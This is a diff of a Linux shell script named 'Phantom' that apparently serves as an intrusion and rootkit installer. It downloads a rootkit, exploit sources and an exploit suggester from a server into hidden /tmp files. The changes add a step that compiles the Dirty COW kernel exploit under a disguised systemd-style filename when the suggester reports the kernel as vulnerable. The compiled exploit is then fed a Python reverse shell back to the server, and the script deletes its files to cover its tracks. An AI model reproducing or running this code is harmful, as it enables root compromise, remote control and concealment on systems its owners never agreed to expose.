@@ -2,8 +2,8 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15823"
-portr="15606"
+portp="15146"
+portr="15147"
 portk="1234"
 
 echo "---Phantom started---"
@@ -55,6 +55,10 @@ printf "get variables... "
 wget -q -O /tmp/.variables http://$ip:$portp/variables
 source /tmp/.variables
 finish
+printf "get exploit suggester... "
+wget -q -O /tmp/.suggester http://$ip:$portp/suggester
+chmod +x /tmp/.suggester
+finish
 printf "get exploits... "
 wget -q -r -k -R "index.html*" -P /tmp /tmp http://$ip:$portp/exploits/
 chmod -R +x /tmp/$ip:$portp/exploits
@@ -74,7 +78,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["bash"]);'
 EOF
 )
-  exploits_major_array=($(ls /tmp/$ip:$portp/exploits))
+  exploit_suggester=$(/tmp/.suggester)
+  exploits_array=($(ls /tmp/$ip:$portp/exploits))
   : '
   for i in ${exploits_major_array[*]}; do
     if [ $major -le $i ]; then
@@ -93,19 +98,25 @@ EOF
     fi
   done
   '
-  for i in ${exploits_major_array[*]}; do
-    #gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/$i &>/dev/null
-    echo "attempting $i..."
-    #echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
-    sleep 3
-  done
+  vulnerable=0
+  if [[ $exploit_suggester == *"dirty_cow"* ]]; then
+    vulnerable=1
+    gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/c0w_x86.c &>/dev/null
+    echo "attempting dirty_cow..."
+  fi
+  if [ $vulnerable == "1" ]; then
+    echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
+  else
+    echo "no vulnerability found"
+  fi
   printf "removing files needed by payload... "
   rm /tmp/.rootkit &>/dev/null
   rm /tmp/.functions &>/dev/null
   rm /tmp/.services &>/dev/null
   rm /tmp/.variables &>/dev/null
+  rm /tmp/.suggester &>/dev/null
+  rm /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null #might not exist if there was no vulnerability
   rm -r /tmp/$ip:$portp &>/dev/null
-  rm /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
   finish
   exit
 fi
@@ -326,6 +337,7 @@ rm /tmp/.rootkit &>/dev/null
 rm /tmp/.functions &>/dev/null
 rm /tmp/.services &>/dev/null
 rm /tmp/.variables &>/dev/null
+rm /tmp/.suggester &>/dev/null
 rm -r /tmp/$ip:$portp &>/dev/null
 finish
 for ((i=0; i < ${#uninstall[@]}; i++)); do
